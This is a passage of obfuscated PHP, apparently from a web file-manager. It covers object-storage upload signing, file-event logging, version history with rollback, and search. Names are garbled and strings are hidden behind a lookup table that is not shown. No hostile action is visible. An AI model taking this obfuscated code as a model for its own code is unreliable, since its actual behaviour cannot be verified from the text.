(strpos($ÎÏŠÃªê, $ãÂ¸À®Ì[238]) === 0) { $ˆò¬ı²[0] = $ãÂ¸À®Ì[239]; } if (isset($ÂÇøÊš[$ãÂ¸À®Ì[240]]) && $ÂÇøÊš[$ãÂ¸À®Ì[240]] == $ãÂ¸À®Ì[241]) { $ˆò¬ı²[0] = $ãÂ¸À®Ì[241]; } $Éşã„Äé = implode($ãÂ¸À®Ì[19], $ˆò¬ı²); $øº½Ò¥’ = base64_encode(hash_hmac($ãÂ¸À®Ì[242], $Éşã„Äé, $this->secret, !0)); $Õ±‡‹Ê  = $ãÂ¸À®Ì[243] . $this->accessKey . $ãÂ¸À®Ì[4] . $øº½Ò¥’; if (strpos($ÎÏŠÃªê, $ãÂ¸À®Ì[238]) === 0) { return array($ãÂ¸À®Ì[244] => $Õ±‡‹Ê , $ãÂ¸À®Ì[235] => $ŞÊˆä); } return $Õ±‡‹Ê ; } public function listUploadParts($ƒıê›† , $Õ¼ï´Šå = array()) { $¤ªÍÖãÃ =& $_SERVER[Å¶¨Şêº]; $ğŒ¯½¡º = str_replace($¤ªÍÖãÃ[245], $¤ªÍÖãÃ[12], $Õ¼ï´Šå[$¤ªÍÖãÃ[185]]); $ïãÙğïµ = $this->client->listParts($this->bucket, $ƒıê›† , $ğŒ¯½¡º); if (!$ïãÙğïµ) { return !1; } unset($Õ¼ï´Šå[$¤ªÍÖãÃ[236]], $Õ¼ï´Šå[$¤ªÍÖãÃ[240]]); $Õ¼ï´Šå[$¤ªÍÖãÃ[105]] = $ƒıê›† ; $ÂĞËüÆ— = $this->multiUploadAuthData($ƒıê›† , $Õ¼ï´Šå); if (empty($ÂĞËüÆ—)) { return !1; } return array($¤ªÍÖãÃ[244] => $ÂĞËüÆ—, $¤ªÍÖãÃ[235] => $Õ¼ï´Šå[$¤ªÍÖãÃ[235]], $¤ªÍÖãÃ[246] => $ïãÙğïµ); } public function getHost() { return parent::getHost() . $_SERVER[Å¶¨Şêº][8] . $this->bucket; } public function size($©¹±ÏÄı) { $ûÆÏìôø = $this->objectMeta($©¹±ÏÄı); return $ûÆÏìôø ? $ûÆÏìôø[$_SERVER[Å¶¨Şêº][87]] : 0; } public function info($óù½ŒÉ¬) { if ($this->isFolder($óù½ŒÉ¬)) { return $this->folderInfo($óù½ŒÉ¬); } else { if ($this->isFile($óù½ŒÉ¬)) { return $this->fileInfo($óù½ŒÉ¬); } } return !1; } public function exist($Î’‘îÇ) { return $this->isFile($Î’‘îÇ) || $this->isFolder($Î’‘îÇ); } public function isFile($€‚®ç) { return !$this->isFolder($€‚®ç) && $this->objectMeta($€‚®ç); } public function isFolder($ÈóÙÀšÂ) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][176], $ÈóÙÀšÂ); } protected function objectMeta($ö£ñ¼”) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][178], $ö£ñ¼”); } protected function _objectMeta($ çë¾–Ş) { $—¡‡æ”› =& $_SERVER[Å¶¨Şêº]; $ çë¾–Ş = rtrim($ çë¾–Ş, $—¡‡æ”›[8]); try { $„¯ÓÏ³ = $this->client->getObjectInfo($this->bucket, $ çë¾–Ş); if (!isset($„¯ÓÏ³[$—¡‡æ”›[232]]) && isset($„¯ÓÏ³[$—¡‡æ”›[247]])) { $„¯ÓÏ³[$—¡‡æ”›[232]] = $„¯ÓÏ³[$—¡‡æ”›[247]]; } } catch (Exception $ÈõÓ‡ïà) { $„¯ÓÏ³ = !1; } if (!$„¯ÓÏ³) { } return $„¯ÓÏ³; } protected function _isFolder($£ç³œ†») { $±—×Ü¨ê =& $_SERVER[Å¶¨Şêº]; $£ç³œ†» = rtrim($£ç³œ†», $±—×Ü¨ê[8]); if ($£ç³œ†» == $±—×Ü¨ê[12] || $£ç³œ†» == $±—×Ü¨ê[8]) { return !0; } $Å¤˜¿å˜ = $this->client->getBucket($this->bucket, $£ç³œ†», null, 1); if (empty($Å¤˜¿å˜[$±—×Ü¨ê[215]])) { return !1; } $¦àŸôã = $Å¤˜¿å˜[$±—×Ü¨ê[215]][0][$±—×Ü¨ê[42]]; return stripos($¦àŸôã, $£ç³œ†» . $±—×Ü¨ê[8]) === 0 ? !0 : !1; if (substr($¦àŸôã, -1) == $±—×Ü¨ê[8]) { return !0; } if (get_path_this($¦àŸôã) == get_path_this($£ç³œ†»)) { return !1; } return !0; } } goto BÖ¯¹®“é—; e‹’‘š©Ğ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\143\x65\x5f\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\162\164", "\x66\x75\x6e\143\x74\151\157\156"), array("\144\x65\163\x63", '', "\151\156\163\x65\162\x74\54\x75\x70\144\x61\164\x65\54\x73\145\154\145\x63\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($”™ÅàÏû, $é”ŒÂ¢¶, $­ÊæÍºé = '') { $Å¬ĞáÌ =& $_SERVER[Å¶¨Şêº]; if (!$this->eventSave) { return; } $àÕƒï…Ó = Model($Å¬ĞáÌ[1337])->sourceInfo($”™ÅàÏû); if (!$àÕƒï…Ó) { return !1; } if ($this->isCacheEvent($àÕƒï…Ó, $é”ŒÂ¢¶)) { return; } if ($­ÊæÍºé && is_string($­ÊæÍºé)) { $­ÊæÍºé = array($Å¬ĞáÌ[1891] => $­ÊæÍºé); } $»¾ï¶÷Ó = array($Å¬ĞáÌ[426] => $”™ÅàÏû, $Å¬ĞáÌ[2073] => $àÕƒï…Ó[$Å¬ĞáÌ[441]], $Å¬ĞáÌ[2074] => $àÕƒï…Ó[$Å¬ĞáÌ[42]], $Å¬ĞáÌ[518] => !empty($àÕƒï…Ó[$Å¬ĞáÌ[518]]) ? $àÕƒï…Ó[$Å¬ĞáÌ[518]] : $Å¬ĞáÌ[12], $Å¬ĞáÌ[1654] => USER_ID, $Å¬ĞáÌ[431] => $é”ŒÂ¢¶, $Å¬ĞáÌ[1656] => $­ÊæÍºé); $this->addSystemLog($é”ŒÂ¢¶, $»¾ï¶÷Ó); unset($»¾ï¶÷Ó[$Å¬ĞáÌ[2074]], $»¾ï¶÷Ó[$Å¬ĞáÌ[518]]); return $this->add($»¾ï¶÷Ó); } private function addSystemLog($œæô¹¯¸, $Â²è©ÕÌ) { $Ø÷ù§¯ =& $_SERVER[Å¶¨Şêº]; if ($œæô¹¯¸ == $Ø÷ù§¯[2075]) { $œæô¹¯¸ = $Â²è©ÕÌ[$Ø÷ù§¯[462]][$Ø÷ù§¯[2076]]; } else { if (in_array($œæô¹¯¸, array($Ø÷ù§¯[1832], $Ø÷ù§¯[2077]))) { $œæô¹¯¸ = $Â²è©ÕÌ[$Ø÷ù§¯[462]][$Ø÷ù§¯[752]]; } } $ı­–Ã„¸ = array_merge($Â²è©ÕÌ, array($Ø÷ù§¯[2078] => $Â²è©ÕÌ[$Ø÷ù§¯[411]], $Ø÷ù§¯[2079] => $Â²è©ÕÌ[$Ø÷ù§¯[2079]])); Hook::trigger($Ø÷ù§¯[2080], $Ø÷ù§¯[2081] . $œæô¹¯¸, $Â²è©ÕÌ); Model($Ø÷ù§¯[1796])->addLog($Ø÷ù§¯[2081] . $œæô¹¯¸, $ı­–Ã„¸); } private function isCacheEvent($ ›×äî•, $Ö–°îá–) { if ($ ›×äî•[$_SERVER[Å¶¨Şêº][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($‹ØÒ”½Ë, $èãäØÜË) { $Í„õõå‰ =& $_SERVER[Å¶¨Şêº]; $ƒÙĞƒ = Model($Í„õõå‰[1337])->sourceInfo($‹ØÒ”½Ë); $æÕ¹æíÑ = array($Í„õõå‰[2076] => $èãäØÜË, $Í„õõå‰[42] => $ƒÙĞƒ[$Í„õõå‰[42]]); return $this->addEvent($‹ØÒ”½Ë, $Í„õõå‰[2075], $æÕ¹æíÑ); } public function eventFileEdit($˜…˜µ½Ó) { $Éşí¯Ê¼ =& $_SERVER[Å¶¨Şêº]; $Ê‡×¦çÜ = array($Éşí¯Ê¼[2082] => $_SERVER[$Éşí¯Ê¼[2083]], $Éşí¯Ê¼[2084] => strtolower(ACTION)); if (isset($GLOBALS[$Éşí¯Ê¼[7]][$Éşí¯Ê¼[2085]])) { $Ê‡×¦çÜ[$Éşí¯Ê¼[2085]] = $Éşí¯Ê¼[99]; } return $this->addEvent($˜…˜µ½Ó, $Éşí¯Ê¼[1822], $Ê‡×¦çÜ); } public function eventRecycle($ïáıŒâ, $«Ã‰Ÿ¶î) { return $this->addEvent($ïáıŒâ, $_SERVER[Å¶¨Şêº][2077], $«Ã‰Ÿ¶î); } public function eventRemove($„¬’Æõó) { $Ã©µ™ù™ =& $_SERVER[Å¶¨Şêº]; $÷ßòÍóÌ = Model($Ã©µ™ù™[1337])->sourceInfo($„¬’Æõó); $ïìÚç–œ = $÷ßòÍóÌ[$Ã©µ™ù™[42]]; return $this->addEvent($÷ßòÍóÌ[$Ã©µ™ù™[441]], $Ã©µ™ù™[1821], $ïìÚç–œ); } public function eventShare($§ÕÆÊâå, $«ÉŒùúı) { return $this->addEvent($§ÕÆÊâå, $_SERVER[Å¶¨Şêº][1832], $«ÉŒùúı); } public function eventMove($ŸßöÙü¹, $¹ÌÆÖó‘, $øÚˆœ¤ù) { $éÕÅ¤Á¬ =& $_SERVER[Å¶¨Şêº]; $­ƒûé±ª = Model($éÕÅ¤Á¬[1337]); $«›ğšäŸ = $­ƒûé±ª->sourceInfo($ŸßöÙü¹); $Îî³À‘ı = $­ƒûé±ª->sourceInfo($¹ÌÆÖó‘); $…”¥ë˜ = $­ƒûé±ª->sourceInfo($øÚˆœ¤ù); $ê´î±õï = array($éÕÅ¤Á¬[1157] => $¹ÌÆÖó‘, $éÕÅ¤Á¬[2086] => $Îî³À‘ı[$éÕÅ¤Á¬[42]], $éÕÅ¤Á¬[2064] => !empty($Îî³À‘ı[$éÕÅ¤Á¬[518]]) ? $Îî³À‘ı[$éÕÅ¤Á¬[518]] : $éÕÅ¤Á¬[12], $éÕÅ¤Á¬[1158] => $øÚˆœ¤ù, $éÕÅ¤Á¬[2087] => $…”¥ë˜[$éÕÅ¤Á¬[42]], $éÕÅ¤Á¬[2088] => !empty($…”¥ë˜[$éÕÅ¤Á¬[518]]) ? $…”¥ë˜[$éÕÅ¤Á¬[518]] : $éÕÅ¤Á¬[12]); $this->addEvent($ŸßöÙü¹, $éÕÅ¤Á¬[557], $ê´î±õï); $«›ğšäŸ = $­ƒûé±ª->sourceInfo($ŸßöÙü¹); $ê´î±õï = array($éÕÅ¤Á¬[411] => $«›ğšäŸ[$éÕÅ¤Á¬[411]], $éÕÅ¤Á¬[42] => $«›ğšäŸ[$éÕÅ¤Á¬[42]]); $this->addEvent($¹ÌÆÖó‘, $éÕÅ¤Á¬[2089], $ê´î±õï); } public function eventCopy($¡ù“µ¿Ê) { $this->eventCreate($¡ù“µ¿Ê, $_SERVER[Å¶¨Şêº][555]); } public function eventRename($¼…ƒè¶İ, $€š¼ıë—, $®Úİ„Á‚) { $İÑ‚Ñœ =& $_SERVER[Å¶¨Şêº]; $æÉ´Ö«€ = array($İÑ‚Ñœ[1157] => $€š¼ıë—, $İÑ‚Ñœ[1158] => $®Úİ„Á‚); return $this->addEvent($¼…ƒè¶İ, $İÑ‚Ñœ[1352], $æÉ´Ö«€); } public function eventAddComment($Ä¢Ùßñ‹, $‡¨¨Û¶») { return $this->addEvent($Ä¢Ùßñ‹, $_SERVER[Å¶¨Şêº][2090], $‡¨¨Û¶»); } public function eventAddDesc($ßïçîˆĞ, $Ò¥íİö) { return $this->addEvent($ßïçîˆĞ, $_SERVER[Å¶¨Şêº][2091], $Ò¥íİö); } public function listBySource($õ‹¯„˜›) { $ÓÅ¦”°ü =& $_SERVER[Å¶¨Şêº]; $´Ö—‹í = Model($ÓÅ¦”°ü[1337])->sourceInfo($õ‹¯„˜›); $ÇÆ÷êÙË = array($ÓÅ¦”°ü[426] => $õ‹¯„˜›); if ($´Ö—‹í[$ÓÅ¦”°ü[419]] == $ÓÅ¦”°ü[99]) { $¶ÌñÉê« = Model($ÓÅ¦”°ü[1337])->listSearchChildren($õ‹¯„˜›, 20000); $¶ÌñÉê«[] = $õ‹¯„˜› . $ÓÅ¦”°ü[70]; $ÇÆ÷êÙË = array($ÓÅ¦”°ü[411] => array($ÓÅ¦”°ü[7], $¶ÌñÉê«)); } $¨¿¨‹­È = $this->where($ÇÆ÷êÙË)->order($ÓÅ¦”°ü[2092])->selectPage(); if ($¨¿¨‹­È[$ÓÅ¦”°ü[376]][$ÓÅ¦”°ü[377]] == 0) { $¨¿¨‹­È[$ÓÅ¦”°ü[376]][$ÓÅ¦”°ü[377]] = 1; $¨¿¨‹­È[$ÓÅ¦”°ü[379]] = array(array($ÓÅ¦”°ü[426] => $õ‹¯„˜›, $ÓÅ¦”°ü[2073] => $´Ö—‹í[$ÓÅ¦”°ü[441]], $ÓÅ¦”°ü[1654] => $´Ö—‹í[$ÓÅ¦”°ü[463]], $ÓÅ¦”°ü[431] => $ÓÅ¦”°ü[2093], $ÓÅ¦”°ü[432] => $´Ö—‹í[$ÓÅ¦”°ü[212]], $ÓÅ¦”°ü[1656] => $ÓÅ¦”°ü[12])); } return $this->eventListParse($¨¿¨‹­È, $õ‹¯„˜›); } private function eventListParse($¹Êõç‘Î, $Ê¦¨æ÷¢) { $³æ˜ãÂš =& $_SERVER[Å¶¨Şêº]; $í‚êª‚° = $¹Êõç‘Î[$³æ˜ãÂš[379]]; $„ˆÀ¶ô½ = array_to_keyvalue($í‚êª‚°, $³æ˜ãÂš[12], $³æ˜ãÂš[411]); $Êã²ìí = array_to_keyvalue($í‚êª‚°, $³æ˜ãÂš[12], $³æ˜ãÂš[2079]); foreach ($í‚êª‚° as $æÛŠœˆ¡) { $Ë¡£ÊÆØ = $æÛŠœˆ¡[$³æ˜ãÂš[462]]; if ($æÛŠœˆ¡[$³æ˜ãÂš[43]] == $³æ˜ãÂš[557] && isset($Ë¡£ÊÆØ[$³æ˜ãÂš[1157]])) { $„ˆÀ¶ô½[] = $Ë¡£ÊÆØ[$³æ˜ãÂš[1157]] . $³æ˜ãÂš[12]; $„ˆÀ¶ô½[] = $Ë¡£ÊÆØ[$³æ˜ãÂš[1158]] . $³æ˜ãÂš[12]; } if ($æÛŠœˆ¡[$³æ˜ãÂš[43]] == $³æ˜ãÂš[2089] && isset($Ë¡£ÊÆØ[$³æ˜ãÂš[411]])) { $„ˆÀ¶ô½[] = $Ë¡£ÊÆØ[$³æ˜ãÂš[411]] . $³æ˜ãÂš[12]; } } $„ˆÀ¶ô½ = array_merge($„ˆÀ¶ô½, $Êã²ìí, array($Ê¦¨æ÷¢ . $³æ˜ãÂš[12])); $„ˆÀ¶ô½ = array_unique($„ˆÀ¶ô½); $‹ªÏŒ’Î = array_unique(array_to_keyvalue($í‚êª‚°, $³æ˜ãÂš[12], $³æ˜ãÂš[1663])); $•û¨¯Õß = Model($³æ˜ãÂš[534])->userListInfo($‹ªÏŒ’Î); $ˆË–Ö¡Ï = Model($³æ˜ãÂš[823])->sourceListInfo($„ˆÀ¶ô½, !0); foreach ($í‚êª‚° as &$æÛŠœˆ¡) { if ($æÛŠœˆ¡[$³æ˜ãÂš[43]] == $³æ˜ãÂš[557] && isset($æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[1157]])) { $æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[1157]] = $ˆË–Ö¡Ï[$æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[1157]]]; $æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[1158]] = $ˆË–Ö¡Ï[$æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[1158]]]; } if ($æÛŠœˆ¡[$³æ˜ãÂš[43]] == $³æ˜ãÂš[2089] && isset($æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[411]])) { $æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[411]] = $ˆË–Ö¡Ï[$æÛŠœˆ¡[$³æ˜ãÂš[462]][$³æ˜ãÂš[411]]]; } $æÛŠœˆ¡[$³æ˜ãÂš[98]] = $ˆË–Ö¡Ï[$æÛŠœˆ¡[$³æ˜ãÂš[411]]]; $æÛŠœˆ¡[$³æ˜ãÂš[2094]] = $ˆË–Ö¡Ï[$æÛŠœˆ¡[$³æ˜ãÂš[2079]]]; if ($æÛŠœˆ¡[$³æ˜ãÂš[43]] == $³æ˜ãÂš[1821]) { $æÛŠœˆ¡[$³æ˜ãÂš[2094]] = $æÛŠœˆ¡[$³æ˜ãÂš[98]]; $æÛŠœˆ¡[$³æ˜ãÂš[2079]] = $æÛŠœˆ¡[$³æ˜ãÂš[2094]][$³æ˜ãÂš[411]]; $æÛŠœˆ¡[$³æ˜ãÂš[98]] = !1; $æÛŠœˆ¡[$³æ˜ãÂš[411]] = $³æ˜ãÂš[12]; } $æÛŠœˆ¡[$³æ˜ãÂš[2024]] = $•û¨¯Õß[$æÛŠœˆ¡[$³æ˜ãÂš[1663]]]; } unset($æÛŠœˆ¡); $¹Êõç‘Î[$³æ˜ãÂš[379]] = $í‚êª‚°; return $¹Êõç‘Î; } public function removeBySource($ƒÙ¬­) { $¡âäÄ“ = array($_SERVER[Å¶¨Şêº][426] => $ƒÙ¬­); $this->where($¡âäÄ“)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\x63\145\x5f\150\x69\163\x74\x6f\162\171"; public function historyCount($¹Øš‚öô) { $Šßé—Ô£ =& $_SERVER[Å¶¨Şêº]; if (!$¹Øš‚öô) { return array(); } if (is_string($¹Øš‚öô) || is_int($¹Øš‚öô)) { $¹Øš‚öô = array($¹Øš‚öô); } $ÙçœÍˆŠ = array($Šßé—Ô£[411], $Šßé—Ô£[1885] => $Šßé—Ô£[500]); $çÂ½Ùà¿ = array($Šßé—Ô£[411] => array($Šßé—Ô£[7], $¹Øš‚öô)); $çĞ–°ôø = $this->field($ÙçœÍˆŠ)->where($çÂ½Ùà¿)->group($Šßé—Ô£[411])->select(); return array_to_keyvalue($çĞ–°ôø, $Šßé—Ô£[411], $Šßé—Ô£[500]); } public function addHistory($Ÿò„é²Ä, $›ı«î¥Ó = '') { $°»»³ÚÎ =& $_SERVER[Å¶¨Şêº]; $­“§ÓĞŒ = array($°»»³ÚÎ[426] => $Ÿò„é²Ä[$°»»³ÚÎ[411]], $°»»³ÚÎ[1654] => isset($Ÿò„é²Ä[$°»»³ÚÎ[465]]) ? $Ÿò„é²Ä[$°»»³ÚÎ[465]] : $Ÿò„é²Ä[$°»»³ÚÎ[463]], $°»»³ÚÎ[478] => $Ÿò„é²Ä[$°»»³ÚÎ[477]], $°»»³ÚÎ[554] => $Ÿò„é²Ä[$°»»³ÚÎ[87]], $°»»³ÚÎ[2095] => $›ı«î¥Ó); if ($GLOBALS[$°»»³ÚÎ[6]][$°»»³ÚÎ[100]][$°»»³ÚÎ[1215]] >= 1) { $this->historyAutoClear($­“§ÓĞŒ[$°»»³ÚÎ[411]]); $this->add($­“§ÓĞŒ); } Hook::trigger($°»»³ÚÎ[2096], $­“§ÓĞŒ); Model($°»»³ÚÎ[2097])->eventFileEdit($Ÿò„é²Ä[$°»»³ÚÎ[411]]); } private function historyAutoClear($ˆ€İÚ«) { $×¾ò›¬¶ =& $_SERVER[Å¶¨Şêº]; $«Ù§üÔÅ = Model($×¾ò›¬¶[768])->get($×¾ò›¬¶[1237]); $Ê¬™Æá = $GLOBALS[$×¾ò›¬¶[6]][$×¾ò›¬¶[100]][$×¾ò›¬¶[1215]]; $ğî×†¶ë = $«Ù§üÔÅ == $×¾ò›¬¶[1238] ? min(5, $Ê¬™Æá) : $Ê¬™Æá; $ğî×†¶ë = $ğî×†¶ë <= 0 ? 0 : $ğî×†¶ë - 1; if ($ğî×†¶ë >= 500) { return; } $¬ëû¼­¦ = array($×¾ò›¬¶[426] => $ˆ€İÚ«); $Ä…Á«Ìö = $this->field($×¾ò›¬¶[2098])->where($¬ëû¼­¦)->order($×¾ò›¬¶[2092])->select(); if (!$Ä…Á«Ìö || $ğî×†¶ë >= count($Ä…Á«Ìö)) { return; } $‰Ú¹Ãì = array_to_keyvalue($Ä…Á«Ìö, $×¾ò›¬¶[12], $×¾ò›¬¶[408]); $‰Ú¹Ãì = array_slice($‰Ú¹Ãì, $ğî×†¶ë); $‘æµè×İ = array_to_keyvalue($Ä…Á«Ìö, $×¾ò›¬¶[12], $×¾ò›¬¶[477]); $‘æµè×İ = array_slice($‘æµè×İ, $ğî×†¶ë); if (!$‰Ú¹Ãì || !$‘æµè×İ) { return; } $¬ëû¼­¦ = array($×¾ò›¬¶[428] => array($×¾ò›¬¶[7], $‰Ú¹Ãì)); $this->where($¬ëû¼­¦)->delete(); Model($×¾ò›¬¶[480])->remove($‘æµè×İ); } public function listData($ŠØ¤õñÁ) { $ÁñŒ‚ßÅ =& $_SERVER[Å¶¨Şêº]; $Ò§ø¸àª = array($ÁñŒ‚ßÅ[426] => $ŠØ¤õñÁ); $ğÌ¿ïøğ = $ÁñŒ‚ßÅ[2099]; $²ó²º = $this->field($ğÌ¿ïøğ)->where($Ò§ø¸àª)->order($ÁñŒ‚ßÅ[2092])->selectPage(); $this->_listAppendUser($²ó²º[$ÁñŒ‚ßÅ[379]]); $ÚÕÄ¦Á = Model($ÁñŒ‚ßÅ[768])->get($ÁñŒ‚ßÅ[1237]); $Ã¶ïÁäÕ = 5; if ($ÚÕÄ¦Á == $ÁñŒ‚ßÅ[1238]) { $²ó²º[$ÁñŒ‚ßÅ[379]] = array_slice($²ó²º[$ÁñŒ‚ßÅ[379]], 0, $Ã¶ïÁäÕ); $²ó²º[$ÁñŒ‚ßÅ[376]] = array($ÁñŒ‚ßÅ[2100] => 1, $ÁñŒ‚ßÅ[2101] => 20, $ÁñŒ‚ßÅ[2102] => 1, $ÁñŒ‚ßÅ[2103] => count($²ó²º[$ÁñŒ‚ßÅ[379]])); } return $²ó²º; } protected function _listAppendUser(&$Ğ˜à±å) { $ÄÀëº…› =& $_SERVER[Å¶¨Şêº]; $ó¿°¨ĞÉ = array_to_keyvalue($Ğ˜à±å, $ÄÀëº…›[12], $ÄÀëº…›[1663]); $ÈğÂÖî÷ = Model($ÄÀëº…›[534])->userListInfo($ó¿°¨ĞÉ); foreach ($Ğ˜à±å as &$ıÒıË¼ï) { $Æ¶´å«ë = $ıÒıË¼ï[$ÄÀëº…›[1663]]; $ıÒıË¼ï[$ÄÀëº…›[463]] = $ÈğÂÖî÷[$Æ¶´å«ë] ? $ÈğÂÖî÷[$Æ¶´å«ë] : !1; } unset($ıÒıË¼ï); } public function fileInfo($ƒ²½ŞÃŞ) { $ğç½’ß =& $_SERVER[Å¶¨Şêº]; $ä™ÔòÛå = $this->tablePrefix; $¼Ÿâ¦†Ö = "{$ä™ÔòÛå}\151\157\x5f\x66\151\x6c\x65\x20\x66\x69\x6c\145\163\40\x6f\x6e\x20\146\151\x6c\145\x73\56\x66\151\x6c\x65\111\104\x20\75\40\150\x69\x73\x74\157\162\171\x2e\146\151\154\x65\x49\104"; return $this->alias($ğç½’ß[2104])->where(array($ğç½’ß[428] => $ƒ²½ŞÃŞ))->join($¼Ÿâ¦†Ö, $ğç½’ß[2105])->find(); } public function removeItem($¦²ÆÆ‰Ù) { $Ü¹È¡ÑÚ =& $_SERVER[Å¶¨Şêº]; $“Óüó…æ = array($Ü¹È¡ÑÚ[428] => $¦²ÆÆ‰Ù); $»Œç§‹Æ = $this->where($“Óüó…æ)->find(); if ($»Œç§‹Æ) { $†õÏ‹Ì– = $this->where($“Óüó…æ)->delete(); Model($Ü¹È¡ÑÚ[480])->remove($»Œç§‹Æ[$Ü¹È¡ÑÚ[477]]); return $†õÏ‹Ì–; } return !1; } public function removeBySource($””İ«) { $¡‰—ˆÁü =& $_SERVER[Å¶¨Şêº]; if (!$””İ«) { return !1; } if (!is_array($””İ«)) { $””İ« = array($””İ«); } $®„ŸæÎ = array($¡‰—ˆÁü[426] => array($¡‰—ˆÁü[7], $””İ«)); $ÑÖ€®ƒ¹ = $this->field($¡‰—ˆÁü[478])->where($®„ŸæÎ)->select(); if ($ÑÖ€®ƒ¹) { $this->where($®„ŸæÎ)->delete(); $£òš“…« = array_to_keyvalue($ÑÖ€®ƒ¹, $¡‰—ˆÁü[12], $¡‰—ˆÁü[477]); Model($¡‰—ˆÁü[480])->remove($£òš“…«); } return !0; } public function setDetail($€œúÚö‘, $ìÎ€­—€) { $¼â³¯³® =& $_SERVER[Å¶¨Şêº]; return $this->where(array($¼â³¯³®[428] => $€œúÚö‘))->save(array($¼â³¯³®[2095] => $ìÎ€­—€)); } public function rollbackToItem($û÷şöÏú, $¶ä©é„) { $•Œ½ğÔĞ =& $_SERVER[Å¶¨Şêº]; $ğÊ‚ĞÒ† = Model($•Œ½ğÔĞ[823])->sourceInfo($û÷şöÏú); $this->addHistory($ğÊ‚ĞÒ†, LNG($•Œ½ğÔĞ[2106])); $®£‹Ì¿º = $this->find($¶ä©é„); $ÛƒñÓ»× = array($•Œ½ğÔĞ[477] => $®£‹Ì¿º[$•Œ½ğÔĞ[477]], $•Œ½ğÔĞ[87] => $®£‹Ì¿º[$•Œ½ğÔĞ[87]], $•Œ½ğÔĞ[96] => time(), $•Œ½ğÔĞ[465] => USER_ID); Model($•Œ½ğÔĞ[823])->where(array($•Œ½ğÔĞ[411] => $û÷şöÏú))->save($ÛƒñÓ»×); return $this->where(array($•Œ½ğÔĞ[428] => $¶ä©é„))->delete(); } public function clearSame($‘Î†¡¤Û) { $×¥³™³­ =& $_SERVER[Å¶¨Şêº]; $ÓÁ¬ƒõ® = $this->listData($‘Î†¡¤Û); $èÖ€İ¨ = array_to_keyvalue_group($ÓÁ¬ƒõ®, $×¥³™³­[477]); $Ò‘Ú¤²Ö = array(); $Ûîó³ = array(); foreach ($èÖ€İ¨ as $»ø©äÖ) { if (!$»ø©äÖ || count($»ø©äÖ) <= 1) { continue; } foreach ($»ø©äÖ as $¸«’Ì) { $Ò‘Ú¤²Ö[] = $¸«’Ì[$×¥³™³­[477]]; $Ûîó³[] = $¸«’Ì[$×¥³™³­[408]]; } } if (!$Ûîó³) { return; } $this->where(array($×¥³™³­[408] => array($×¥³™³­[7], $Ûîó³)))->delete(); Model($×¥³™³­[480])->remove($Ò‘Ú¤²Ö); } public function userSpace() { $œ·Í×È =& $_SERVER[Å¶¨Şêº]; $â¥‰‹­ = $this->tablePrefix; $ù½šö¯è = array($œ·Í×È[1654] => USER_ID); $ªŠ„Óı­ = "{$â¥‰‹­}\151\x6f\x5f\146\151\x6c\145\40\x66\151\154\x65\x73\x20\157\x6e\40\146\x69\x6c\x65\x73\56\146\151\154\145\111\104\40\75\40\150\x69\163\164\157\162\171\56\x66\x69\154\145\111\x44"; return $this->alias($œ·Í×È[2104])->where($ù½šö¯è)->join($ªŠ„Óı­, $œ·Í×È[2105])->sum($œ·Í×È[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ûšúàãê) { $«ÆÃÅ‘€ =& $_SERVER[Å¶¨Şêº]; $™íŸ€èí = KodIO::fileTypeList(); $×–»’•ì = $™íŸ€èí[$ûšúàãê]; if (!$×–»’•ì) { return array(); } $ñµ“­Êõ = $×–»’•ì[$«ÆÃÅ‘€[185]]; $ÕÚ·Ï¢ = $«ÆÃÅ‘€[7]; if (!$×–»’•ì[$«ÆÃÅ‘€[185]]) { $­ù¨ù = array_to_keyvalue($™íŸ€èí, $«ÆÃÅ‘€[12], $«ÆÃÅ‘€[185]); $ñµ“­Êõ = implode($«ÆÃÅ‘€[60], $­ù¨ù); $ÕÚ·Ï¢ = $«ÆÃÅ‘€[2107]; } $ôù•È = explode($«ÆÃÅ‘€[60], trim($ñµ“­Êõ, $«ÆÃÅ‘€[60])); return array($ÕÚ·Ï¢, $ôù•È); } public function listPathType($´Çñ¦ší) { $‰£¶³¦¶ =& $_SERVER[Å¶¨Şêº]; $›íì” = $this->fileTypeWhere($´Çñ¦ší); if (!$›íì”) { return array(); } $³‘Â¶¬¶ = USER_ID; $¡û—•¿ = Model($‰£¶³¦¶[534])->getInfo($³‘Â¶¬¶); $‘óúÑÚ† = array($‰£¶³¦¶[585] => SourceModel::TYPE_USER, $‰£¶³¦¶[520] => array($‰£¶³¦¶[549], $‰£¶³¦¶[530] . $¡û—•¿[$‰£¶³¦¶[98]][$‰£¶³¦¶[411]] . $‰£¶³¦¶[550]), $‰£¶³¦¶[586] => $³‘Â¶¬¶, $‰£¶³¦¶[583] => 0, $‰£¶³¦¶[584] => $›íì”); return $this->listSource($‘óúÑÚ†); } public function listSearch($¹ß÷øòÉ, $ù¥àÜ = 300) { $Ü¾òÅã =& $_SERVER[Å¶¨Şêº]; if (isset($¹ß÷øòÉ[$Ü¾òÅã[1946]]) && $¹ß÷øòÉ[$Ü¾òÅã[1946]]) { $¹ß÷øòÉ[$Ü¾òÅã[1946]] = str_replace($Ü¾òÅã[393], $Ü¾òÅã[2108], trim($¹ß÷øòÉ[$Ü¾òÅã[1946]])); } $¾şŞôâ¥ = $this->_parseSearchWhere($¹ß÷øòÉ); if (!isset($¾şŞôâ¥[$Ü¾òÅã[440]])) { $¾şŞôâ¥[$Ü¾òÅã[440]] = 0; } $‘¹àÉîÓ = $Ü¾òÅã[2109]; $Š²ÖäÛ¶ = $¾şŞôâ¥; 